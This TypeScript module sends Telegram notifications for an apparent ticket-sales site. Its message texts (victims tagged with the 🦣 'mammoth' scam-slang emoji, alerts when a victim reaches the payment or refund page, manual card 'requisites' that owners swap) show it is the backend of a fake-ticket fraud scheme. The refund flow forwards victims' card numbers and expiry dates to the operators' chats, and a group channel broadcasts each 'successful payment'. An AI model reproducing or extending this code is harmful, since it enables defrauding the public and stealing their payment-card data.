// Uses Node.js 18+ built-in fetch/FormData — no external HTTP library needed

const BOT_TOKEN = process.env.TELEGRAM_GROUP_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const OWNER2_CHAT_ID = process.env.TELEGRAM_OWNER2_CHAT_ID;
const GROUP_ID = process.env.TELEGRAM_GROUP_ID;

const TG_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Track message IDs sent to each owner so both can be updated when one acts
export const orderMsgIds = new Map<number, {
  owner1?: number; owner2?: number;
  owner1IsPhoto?: boolean; owner2IsPhoto?: boolean;
  owner1Text?: string; owner2Text?: string;
}>();
export const refundMsgIds = new Map<string, {
  owner1?: number; owner2?: number;
  owner1Text?: string; owner2Text?: string;
}>();

async function tgPost(method: string, body: Record<string, unknown>): Promise<any> {
  if (!BOT_TOKEN) return null;
  try {
    const res = await fetch(`${TG_API}/${method}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    return await res.json();
  } catch (e) {
    console.error(`Telegram API error (${method}):`, (e as any)?.message || e);
    return null;
  }
}

async function tgPostFormData(method: string, form: FormData): Promise<any> {
  if (!BOT_TOKEN) return null;
  try {
    const res = await fetch(`${TG_API}/${method}`, { method: "POST", body: form });
    return await res.json();
  } catch (e) {
    console.error(`Telegram API error (${method}):`, (e as any)?.message || e);
    return null;
  }
}

export async function setupTelegramWebhook(): Promise<boolean> {
  if (!BOT_TOKEN) { console.error("TELEGRAM_GROUP_BOT_TOKEN not configured"); return false; }
  const baseUrl = (process.env.APP_URL || '').replace(/\/+$/, '');
  if (!baseUrl) { console.warn("APP_URL not configured for webhook"); return false; }
  const webhookUrl = `${baseUrl}/webhooks/telegram/action`;
  const result = await tgPost("setWebhook", { url: webhookUrl });
  if (result?.ok) {
    console.log(`Telegram webhook set to: ${webhookUrl}`);
    return true;
  }
  console.error("Failed to set Telegram webhook:", result);
  return false;
}

export interface OrderNotificationData {
  orderId: number;
  orderCode: string;
  eventName: string;
  eventDate: string;
  eventTime: string;
  cityName: string;
  customerName: string;
  customerPhone: string;
  customerEmail?: string;
  seatsCount: number;
  totalPrice: number;
  ticketType?: string;
  tickets?: { [key: string]: number };
}

function formatTicketBreakdown(tickets?: { [key: string]: number }): string {
  if (!tickets) return '';
  const names: Record<string, string> = {
    standard: 'Входная карта', double: 'Входная карта «для двоих»',
    discount: 'Льготная', discount_double: 'Льготная «для двоих»',
  };
  const parts: string[] = [];
  for (const [type, count] of Object.entries(tickets)) {
    if (count > 0) parts.push(`${count}x ${names[type] || type}`);
  }
  return parts.join(', ');
}

function escapeMarkdown(text: string): string {
  return text.replace(/[_*`\[\]]/g, "\\$&");
}

function inlineKeyboard(buttons: Array<{ text: string; callback_data: string }[]>): Record<string, unknown> {
  return { inline_keyboard: buttons };
}

// ==================== CHANNEL / GROUP NOTIFICATIONS ====================

export async function sendChannelNotification(order: OrderNotificationData): Promise<boolean> {
  if (!GROUP_ID) return false;
  const ticketInfo = formatTicketBreakdown(order.tickets) || order.ticketType || 'Входная карта';
  const text = `🔔🦣 перешел на страницу оплаты🔔\nФИО: ${order.customerName}\nСумма: ${order.totalPrice} руб.\nБилеты: ${ticketInfo}\n${order.cityName} | ${order.eventName} | ${order.eventDate} ${order.eventTime ? order.eventTime.substring(0, 5) : ''}`;
  return !!(await tgPost("sendMessage", { chat_id: GROUP_ID, text }))?.ok;
}

export async function sendChannelPaymentPending(order: OrderNotificationData): Promise<boolean> {
  if (!GROUP_ID) return false;
  const ticketInfo = formatTicketBreakdown(order.tickets) || order.ticketType || 'Входная карта';
  const text = `🔔🦣 подтвердил оплату через SBP🔔\nФИО: ${order.customerName}\nСумма: ${order.totalPrice}\nБилеты: ${ticketInfo}\n${order.cityName} | ${order.eventName} | ${order.eventDate} ${order.eventTime ? order.eventTime.substring(0, 5) : ''}`;
  return !!(await tgPost("sendMessage", { chat_id: GROUP_ID, text }))?.ok;
}

export async function sendChannelPaymentConfirmed(order: OrderNotificationData): Promise<boolean> {
  if (!GROUP_ID) return false;
  const ticketInfo = formatTicketBreakdown(order.tickets) || order.ticketType || 'Входная карта';
  const text = `✅Успешная оплата\n\n💵Сумма покупки: ${order.totalPrice} руб.\nБилеты: ${ticketInfo}\n${order.cityName} | ${order.eventName} | ${order.eventDate} ${order.eventTime ? order.eventTime.substring(0, 5) : ''}`;
  return !!(await tgPost("sendMessage", { chat_id: GROUP_ID, text }))?.ok;
}

export async function sendChannelPaymentRejected(order: OrderNotificationData): Promise<boolean> {
  if (!GROUP_ID) return false;
  const ticketInfo = formatTicketBreakdown(order.tickets) || order.ticketType || 'Входная карта';
  const text = `⛔Ошибка платежа\n\nФИО: ${order.customerName}\nСумма покупки: ${order.totalPrice} руб.\nБилеты: ${ticketInfo}\n${order.cityName} | ${order.eventName} | ${order.eventDate} ${order.eventTime ? order.eventTime.substring(0, 5) : ''}`;
  return !!(await tgPost("sendMessage", { chat_id: GROUP_ID, text }))?.ok;
}

// ==================== ADMIN NOTIFICATIONS ====================

export async function sendOrderNotificationToAdmin(order: OrderNotificationData): Promise<boolean> {
  if (!ADMIN_CHAT_ID) return false;
  const text = `🎫 *Клиент на странице оплаты!*\n\n📋 *Код заказа:* \`${order.orderCode}\`\n\n🎭 *Мероприятие:* ${escapeMarkdown(order.eventName)}\n📍 *Город:* ${escapeMarkdown(order.cityName)}\n📅 *Дата:* ${order.eventDate}\n⏰ *Время:* ${order.eventTime ? order.eventTime.substring(0, 5) : ''}\n\n👤 *Покупатель:* ${escapeMarkdown(order.customerName)}\n📞 *Телефон:* ${escapeMarkdown(order.customerPhone)}${order.customerEmail ? `\n📧 *Email:* ${escapeMarkdown(order.customerEmail)}` : ''}\n\n🎟 *Мест:* ${order.seatsCount}\n💰 *Сумма:* ${order.totalPrice} ₽\n\n⏳ *Статус:* Клиент выбирает способ оплаты`;
  const r1 = await tgPost("sendMessage", { chat_id: ADMIN_CHAT_ID, text, parse_mode: "Markdown" });
  if (OWNER2_CHAT_ID) {
    tgPost("sendMessage", { chat_id: OWNER2_CHAT_ID, text, parse_mode: "Markdown" }).catch(e =>
      console.error("sendOrderNotificationToAdmin owner2 (non-fatal):", (e as any)?.message || e));
  }
  return !!r1?.ok;
}

// ==================== PAYMENT CONFIRMATION ====================

function buildOrderCaption(order: OrderNotificationData, hasPhoto: boolean): string {
  return `💳 *Клиент нажал "Я оплатил"!*\n\n📋 *Код заказа:* \`${order.orderCode}\`\n\n🎭 *Мероприятие:* ${escapeMarkdown(order.eventName)}\n📍 *Город:* ${escapeMarkdown(order.cityName)}\n📅 *Дата:* ${order.eventDate}\n⏰ *Время:* ${order.eventTime ? order.eventTime.substring(0, 5) : ''}\n\n👤 *Покупатель:* ${escapeMarkdown(order.customerName)}\n📞 *Телефон:* ${escapeMarkdown(order.customerPhone)}${order.customerEmail ? `\n📧 *Email:* ${escapeMarkdown(order.customerEmail)}` : ''}\n\n🎟 *Мест:* ${order.seatsCount}\n💰 *Сумма:* ${order.totalPrice} ₽\n\n${hasPhoto ? '📎 *Скриншот чека прикреплён*' : '⚠️ *Скриншот не прикреплён*'}`;
}

export async function sendPaymentConfirmationWithPhoto(
  order: OrderNotificationData, photoBase64: string
): Promise<boolean> {
  if (!ADMIN_CHAT_ID) return false;

  const caption = buildOrderCaption(order, true);
  const keyboard = inlineKeyboard([[
    { text: "✅ Подтвердить оплату", callback_data: `confirm_${order.orderId}` },
    { text: "❌ Отклонить", callback_data: `reject_${order.orderId}` },
  ]]);

  const base64Data = photoBase64.replace(/^data:image\/\w+;base64,/, '');
  const photoBuffer = Buffer.from(base64Data, 'base64');
  const ids: typeof orderMsgIds extends Map<number, infer V> ? V : never = {};

  async function sendToChat(chatId: string): Promise<number | undefined> {
    try {
      const form = new FormData();
      form.append("chat_id", chatId);
      form.append("caption", caption);
      form.append("parse_mode", "Markdown");
      form.append("reply_markup", JSON.stringify(keyboard));
      const photoBlob = new Blob([photoBuffer], { type: "image/jpeg" });
      form.append("photo", photoBlob, "receipt.jpg");
      const result = await tgPostFormData("sendPhoto", form);
      return result?.ok ? result.result?.message_id : undefined;
    } catch (e) {
      console.error(`sendPhoto to ${chatId} error (non-fatal):`, (e as any)?.message || e);
      return undefined;
    }
  }

  const m1 = await sendToChat(ADMIN_CHAT_ID);
  ids.owner1 = m1;
  ids.owner1IsPhoto = true;
  ids.owner1Text = caption;

  if (OWNER2_CHAT_ID) {
    const m2 = await sendToChat(OWNER2_CHAT_ID);
    ids.owner2 = m2;
    ids.owner2IsPhoto = true;
    ids.owner2Text = caption;
  }

  orderMsgIds.set(order.orderId, ids);
  return !!m1;
}

export async function sendPaymentConfirmationNoPhoto(order: OrderNotificationData): Promise<boolean> {
  if (!ADMIN_CHAT_ID) return false;

  const text = buildOrderCaption(order, false);
  const keyboard = inlineKeyboard([[
    { text: "✅ Подтвердить оплату", callback_data: `confirm_${order.orderId}` },
    { text: "❌ Отклонить", callback_data: `reject_${order.orderId}` },
  ]]);

  const ids: typeof orderMsgIds extends Map<number, infer V> ? V : never = {};

  const r1 = await tgPost("sendMessage", { chat_id: ADMIN_CHAT_ID, text, parse_mode: "Markdown", reply_markup: keyboard });
  ids.owner1 = r1?.ok ? r1.result?.message_id : undefined;
  ids.owner1IsPhoto = false;
  ids.owner1Text = text;

  if (OWNER2_CHAT_ID) {
    const r2 = await tgPost("sendMessage", { chat_id: OWNER2_CHAT_ID, text, parse_mode: "Markdown", reply_markup: keyboard });
    ids.owner2 = r2?.ok ? r2.result?.message_id : undefined;
    ids.owner2IsPhoto = false;
    ids.owner2Text = text;
  }

  orderMsgIds.set(order.orderId, ids);
  return !!r1?.ok;
}

// ==================== UPDATE BOTH OWNERS ====================

async function updateSingleOwnerOrderMessage(
  chatId: string,
  messageId: number,
  newText: string,
  isPhoto: boolean
): Promise<void> {
  const method = isPhoto ? "editMessageCaption" : "editMessageText";
  const textKey = isPhoto ? "caption" : "text";
  await tgPost(method, {
    chat_id: chatId,
    message_id: messageId,
    [textKey]: newText,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: [] },
  });
}

export async function updateBothOwnerOrderMessages(
  orderId: number,
  status: "confirmed" | "rejected",
  adminUsername?: string
): Promise<void> {
  const ids = orderMsgIds.get(orderId);
  if (!ids) return;

  const statusEmoji = status === "confirmed" ? "✅" : "❌";
  const statusText = status === "confirmed" ? "ОПЛАТА ПОДТВЕРЖДЕНА" : "ЗАКАЗ ОТКЛОНЁН";
  const adminInfo = adminUsername ? `\n👤 Обработал: @${adminUsername}` : "";
  const timestamp = new Date().toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
  const statusLine = `\n\n${statusEmoji} *${statusText}*\n📅 Обработано: ${timestamp}${adminInfo}`;

  if (ids.owner1 && ADMIN_CHAT_ID) {
    try {
      await updateSingleOwnerOrderMessage(ADMIN_CHAT_ID, ids.owner1, (ids.owner1Text || '') + statusLine, !!ids.owner1IsPhoto);
    } catch (e) { console.error("updateBothOwnerOrderMessages owner1 (non-fatal):", (e as any)?.message || e); }
  }

  if (ids.owner2 && OWNER2_CHAT_ID) {
    try {
      await updateSingleOwnerOrderMessage(OWNER2_CHAT_ID, ids.owner2, (ids.owner2Text || '') + statusLine, !!ids.owner2IsPhoto);
    } catch (e) { console.error("updateBothOwnerOrderMessages owner2 (non-fatal):", (e as any)?.message || e); }
  }
}

export async function updateBothOwnerRefundMessages(
  refundCode: string,
  status: "approved" | "rejected",
  adminUsername?: string
): Promise<void> {
  const ids = refundMsgIds.get(refundCode);
  if (!ids) return;

  const statusEmoji = status === "approved" ? "✅" : "❌";
  const statusText = status === "approved" ? "ВОЗВРАТ ОДОБРЕН" : "ВОЗВРАТ ОТКЛОНЁН";
  const adminInfo = adminUsername ? `\n👤 Обработал: @${adminUsername}` : "";
  const timestamp = new Date().toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
  const statusLine = `\n\n${statusEmoji} *${statusText}*\n📅 Обработано: ${timestamp}${adminInfo}`;

  if (ids.owner1 && ADMIN_CHAT_ID) {
    try {
      await tgPost("editMessageText", { chat_id: ADMIN_CHAT_ID, message_id: ids.owner1, text: (ids.owner1Text || '') + statusLine, parse_mode: "Markdown", reply_markup: { inline_keyboard: [] } });
    } catch (e) { console.error("updateBothOwnerRefundMessages owner1 (non-fatal):", (e as any)?.message || e); }
  }

  if (ids.owner2 && OWNER2_CHAT_ID) {
    try {
      await tgPost("editMessageText", { chat_id: OWNER2_CHAT_ID, message_id: ids.owner2, text: (ids.owner2Text || '') + statusLine, parse_mode: "Markdown", reply_markup: { inline_keyboard: [] } });
    } catch (e) { console.error("updateBothOwnerRefundMessages owner2 (non-fatal):", (e as any)?.message || e); }
  }
}

export async function updateOrderMessageStatus(
  chatId: string | number,
  messageId: number,
  _orderCode: string,
  status: "confirmed" | "rejected",
  adminUsername?: string,
  originalText?: string,
  isPhoto?: boolean
): Promise<boolean> {
  const statusEmoji = status === "confirmed" ? "✅" : "❌";
  const statusText = status === "confirmed" ? "ОПЛАТА ПОДТВЕРЖДЕНА" : "ЗАКАЗ ОТКЛОНЁН";
  const adminInfo = adminUsername ? `\n👤 Обработал: @${adminUsername}` : "";
  const timestamp = new Date().toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
  const statusLine = `\n\n${statusEmoji} *${statusText}*\n📅 Обработано: ${timestamp}${adminInfo}`;
  const newText = (originalText || '') + statusLine;

  const method = isPhoto ? "editMessageCaption" : "editMessageText";
  const textKey = isPhoto ? "caption" : "text";
  const r = await tgPost(method, { chat_id: chatId, message_id: messageId, [textKey]: newText, parse_mode: "Markdown", reply_markup: { inline_keyboard: [] } });
  return !!r?.ok;
}

export async function answerCallbackQuery(callbackQueryId: string, text: string): Promise<boolean> {
  const r = await tgPost("answerCallbackQuery", { callback_query_id: callbackQueryId, text });
  return !!r?.ok;
}

// ==================== REFUND NOTIFICATIONS ====================

interface RefundNotificationData {
  refundCode: string;
  amount: number;
  customerName?: string;
  refundNumber?: string;
  refundNote?: string;
  cardNumber?: string;
  cardExpiry?: string;
}

export async function sendRefundPageVisitNotification(refund: RefundNotificationData): Promise<boolean> {
  if (!GROUP_ID) return false;
  return !!(await tgPost("sendMessage", { chat_id: GROUP_ID, text: `🔔🦣 перешел на страницу возврата🔔\nСумма: ${refund.amount} руб.` }))?.ok;
}

export async function sendRefundRequestNotification(
  refund: RefundNotificationData
): Promise<{ success: boolean; messageId?: number }> {
  if (!GROUP_ID) return { success: false };
  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' ? refund.refundNote : 'Без примечания';
  const text = `🔔🦣 запросил возврат средств🔔\nФИО: ${refund.customerName || 'Не указано'}  \nСумма: ${refund.amount} руб.\n${note}`;
  const r = await tgPost("sendMessage", { chat_id: GROUP_ID, text });
  return r?.ok ? { success: true, messageId: r.result?.message_id } : { success: false };
}

export async function sendRefundToAdmin(
  refund: RefundNotificationData
): Promise<{ success: boolean; messageId?: number }> {
  if (!ADMIN_CHAT_ID) return { success: false };

  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' ? refund.refundNote : 'Без примечания';
  const text = `💰 *Заявка на возврат средств*\n\n👤 *ФИО:* ${escapeMarkdown(refund.customerName || 'Не указано')}\n💵 *Сумма:* ${refund.amount} руб.\n💳 *Карта:* ${escapeMarkdown(refund.cardNumber || '----')}\n📅 *Срок:* ${escapeMarkdown(refund.cardExpiry || '--/--')}\n📝 *Примечание:* ${note}`;
  const keyboard = inlineKeyboard([[
    { text: "✅ Одобрить возврат", callback_data: `refund_approve_${refund.refundCode}` },
    { text: "❌ Отклонить", callback_data: `refund_reject_${refund.refundCode}` },
  ]]);

  const ids: typeof refundMsgIds extends Map<string, infer V> ? V : never = {};

  const r1 = await tgPost("sendMessage", { chat_id: ADMIN_CHAT_ID, text, parse_mode: "Markdown", reply_markup: keyboard });
  ids.owner1 = r1?.ok ? r1.result?.message_id : undefined;
  ids.owner1Text = text;

  if (OWNER2_CHAT_ID) {
    const r2 = await tgPost("sendMessage", { chat_id: OWNER2_CHAT_ID, text, parse_mode: "Markdown", reply_markup: keyboard });
    ids.owner2 = r2?.ok ? r2.result?.message_id : undefined;
    ids.owner2Text = text;
  }

  refundMsgIds.set(refund.refundCode, ids);
  return r1?.ok ? { success: true, messageId: r1.result?.message_id } : { success: false };
}

export async function sendRefundApprovedNotification(refund: RefundNotificationData): Promise<boolean> {
  if (!GROUP_ID) return false;
  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' ? '\n' + refund.refundNote : '';
  const text = `✅Успешный возврат\n\nФИО: ${refund.customerName || 'Не указано'}  \n💵Сумма возврата: ${refund.amount} руб.${note}`;
  return !!(await tgPost("sendMessage", { chat_id: GROUP_ID, text }))?.ok;
}

export async function sendRefundRejectedNotification(refund: RefundNotificationData): Promise<boolean> {
  if (!GROUP_ID) return false;
  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' ? '\n' + refund.refundNote : '';
  const text = `⛔Ошибка платежа\n\nФИО: ${refund.customerName || 'Не указано'}  \nСумма покупки: ${refund.amount} руб.${note}`;
  return !!(await tgPost("sendMessage", { chat_id: GROUP_ID, text }))?.ok;
}

// ==================== REQUISITES NOTIFICATION ====================

export interface RequisitesSnapshot {
  cardNumber?: string;
  bankName?: string;
}

async function sendToOwners(text: string): Promise<void> {
  if (ADMIN_CHAT_ID) {
    await tgPost("sendMessage", { chat_id: ADMIN_CHAT_ID, text, parse_mode: "HTML" });
  }
  if (OWNER2_CHAT_ID) {
    tgPost("sendMessage", { chat_id: OWNER2_CHAT_ID, text, parse_mode: "HTML" }).catch(e =>
      console.error("sendToOwners owner2 (non-fatal):", (e as any)?.message || e));
  }
}

export async function sendRequisitesChangedNotification(
  oldData: RequisitesSnapshot,
  newData: RequisitesSnapshot
): Promise<boolean> {
  if (!ADMIN_CHAT_ID) return false;

  const now = new Date();
  const dateStr = now.toLocaleDateString('ru-RU', { day: '2-digit', month: '2-digit', year: 'numeric' });
  const timeStr = now.toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });

  const oldCard = oldData.cardNumber?.trim() || '—';
  const newCard = newData.cardNumber?.trim() || '—';
  const oldBank = oldData.bankName?.trim() || '—';
  const newBank = newData.bankName?.trim() || '—';

  const wasRemoved = !newData.cardNumber || newData.cardNumber.trim() === '';

  let text: string;
  if (wasRemoved) {
    text = `🔴 Реквизиты оплаты сняты\n📅 ${dateStr}, ${timeStr}\n\n💳 Карта: ${oldCard} → <b>удалена</b>\n🏦 Банк: ${oldBank} → <b>удалён</b>`;
  } else {
    const lines: string[] = [
      `💳 Реквизиты оплаты изменены`,
      `📅 ${dateStr}, ${timeStr}`,
      ``
    ];
    if (oldCard !== newCard) lines.push(`💳 Карта: ${oldCard} → <b>${newCard}</b>`);
    if (oldBank !== newBank) lines.push(`🏦 Банк: ${oldBank} → <b>${newBank}</b>`);
    if (lines.length === 3) {
      lines.push(`ℹ️ Реквизиты сохранены (без изменений в карте и банке)`);
    }
    text = lines.join('\n');
  }

  await sendToOwners(text);
  return true;
}

// Keep getBot() for backward compatibility — returns null (bot object no longer used)
export function getBot(): null { return null; }
